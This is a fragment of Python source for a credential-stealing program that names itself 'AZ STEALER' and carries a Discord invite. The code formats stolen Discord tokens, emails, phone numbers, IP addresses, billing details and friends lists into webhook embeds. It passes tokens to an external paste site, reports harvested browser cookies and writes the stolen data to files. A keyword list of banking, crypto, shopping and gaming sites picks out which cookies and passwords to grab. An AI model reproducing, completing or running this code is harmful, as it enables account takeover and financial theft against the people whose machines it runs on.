        ...
        'embeds':[
{
            ...
            'fields':[
{
                    'name':'<:AZ:1075079617293066380> Token:',
                    'value':f"`{token}`\n[Click to copy](https://paste-pgpj.onrender.com/?p={token})"
},
{
                    'name':'<:blackplanet14:1080992507481042995> Email:',
                    'value':f"`{email}`",
                    'inline':True
},
{
                    'name':'<a:black66665:1080992338492526723> Phone:',
                    'value':f"{phone}",
                    'inline':True
},
{
                    'name':'<:blackpill:1080992626901274804> IP:',
                    'value':f"`{getip()}`",
                    'inline':True
},
{
                    'name':'<:blackhellokitty:1080992413688025241> Badges:',
                    'value':f"{nitro}{badge}",
                    'inline':True
},
{
                    'name':'<a:AZ:1075079691033116844> Billing:',
                    'value':f"{billing}",
                    'inline':True
},
{
                    'name':'<a:blackdiamante:1080992368674746389> HQ Friends:',
                    'value':f"{friends}",
                    'inline':False
}
],
        ...
        'embeds':[
{
            ...
            'fields':[
{
                'name':'Cookies that have been found:',
                'value':rb
}
],
            'author':{
...
def writeforfile(data,name):
    ...
    with open(path,mode='w',encoding='utf-8')as f:
        f.write(f"AZ STEALER | https://discord.gg/YphZ9Gb3P6\n\n")
        for line in data:
            if line[0]!='':
                f.write(f"{line}\n")
Tokens=''
...
keyword=[
    '[mail](https://mail.google.com/mail/)','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','[card](https://www.worldcard.nl/)','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)','[netflix](https://netflix.com)'
]
cookiWords=[]
paswWords=[]
GatherAll()
